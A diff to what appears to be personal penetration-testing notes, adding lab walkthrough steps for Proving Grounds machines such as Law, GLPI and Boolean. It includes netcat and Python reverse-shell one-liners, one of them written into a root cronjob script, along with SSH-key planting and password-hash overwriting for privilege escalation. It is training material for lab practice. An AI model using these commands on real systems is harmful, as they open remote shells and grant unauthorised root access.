@@ -2,6 +2,9 @@
 - [General](#general)
   - [Important Files](#important-files)
   - [Reverse Shell](#reverse-shell)
+- [PG Grounds & HTB]
+  - [Linux Boxes](#linux-boxes)
+
 - [SQL](#sql)
   - [MYSQL](#mysql)
 - [Tools](#tools)
@@ -77,6 +80,80 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 # when using os
 os.system('nc 192.168.45.175 80 -e /bin/sh')
 ```
+
+# Linux Boxes
+## Proving Grounds
+**Twiggy**
+  Foothold:
+    - curl -v http://192.168.x.x:3000/
+    - [Saltstack Exploit]()
+  No privesc
+
+**Exfiltrated**
+  Foothold:
+    - Subrion Exploit with admin:admin credentials
+    - Manually uploaded a .phar file
+  PrivEsc:
+    - Found a cronjob running every minute
+    - /opt/image-exif.sh
+    - Exiftool exploit and create malicious jpg file
+
+**Astronaut**
+  Foothold:
+    - [GRAV CMS Exploit](https://github.com/CsEnox/CVE-2021-21425/tree/main)
+  PrivEsc:
+    - Uncommon setuid binaries
+    - [/usr/bin/php7.4 exploit](https://gtfobins.github.io/gtfobins/php/#suid)
+
+**Blackgate**
+  Foothold:
+    - [Redis 4.0.14 Exploit](https://github.com/Ridter/redis-rce)
+  PrivEsc:
+    - pwnkit
+
+**Boolean**
+  Foothold: 
+    - Create a useraccount and go checkout confirmation part. We have to intercept the email edit request with burp and add user[confirmed]=true
+    - On upload page, when we try downloading files, we can see cwd which means current working directory. We found directory traversal
+    - After checking username list we create an ssh key set and add it to authorized keys and upload it to one of the found users and login as that user using ssh -i
+  PrivEsc:
+    - Check user's .bash_aliases file: our owner has root key and can login as root
+    - ssh -l root -i ~/.ssh/keys/root 127.0.0.1 -o IdentitiesOnly=true
+
+**Clue**
+  Foothold:
+    - Cassandra Exploit: directory traversal
+    - 
+
+**Law**
+  Foothold:
+    - [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
+    - Change POST /htmLawedTest.php to POST /
+    - Exec code I used is included [Proving Grounds Law writeup](https://www.notion.so/Law-28c97105f0134218b24a14a5fcf2bfc3)
+  PrivEsc: cronjob that wasn't detected by linpeas
+    - Run `./pspy64 -pf -i 1000`
+    - Check `CMD: UID=0     PID=34261  | /bin/sh -c /var/www/cleanup.sh`
+    - /var/www/cleanup.sh is owned by the initial shell user
+    - `echo "nc 192.168.45.175 80 -e /bin/sh" > cleanup.sh`
+
+**GLPI**
+  Foothold: [HTMLawed Exploit](https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/)
+    - Exec code I used is included [Proving Grounds GLPI writeup](https://www.notion.so/GLPI-changeuserpass-e1451beb5374490b8de5d1558598aaa4)
+  PrivEsc:
+    - linpeas: Searching passwords in config PHP files
+      - /var/www/glpi/config/config_db.php
+      - Found db username and password
+      - Found another user's password hash(betty)
+      - Couldn't crack the bash
+      - Updated Betty's password hash
+      - Log in as betty on GLPI and found a ticket about betty's password
+      - Login as betty through ssh
+    - linpeas: Interesting writable files owned by me or writable by everyone
+      - /opt/jetty/jetty-base/webapps
+      - There is also an active port on 8080
+      - Type: [Jetty RCE exploit](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)
+
+
 
 # SQL
 ## MYSQL
@@ -207,6 +284,7 @@ ssh -N -R 9998 kali@192.168.118.4
 - Any .config, .conf files?
 
 ## General Tips!
+- Try "Jetty exploit", "Jetty RCE"...
 - Open the website and view page/page sources
   - gobuster: wait until it is finished since some important directories show up later!(ex. /under_construction)
   - feroxbuster
